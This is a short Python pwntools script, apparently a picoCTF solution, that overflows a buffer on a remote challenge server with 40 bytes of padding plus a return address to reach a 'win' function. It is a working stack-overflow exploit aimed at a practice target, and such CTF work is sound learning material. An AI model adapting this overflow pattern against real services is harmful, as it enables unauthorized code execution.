from pwn import *

# p = process('./vuln')
p = remote('mysterious-sea.picoctf.net', 56654)

offset = 40

win_address = 0x401256

payload = b"A" * offset + p64(win_address)

p.recvuntil(b"Please enter your name:")

p.sendline(payload)

p.interactive()
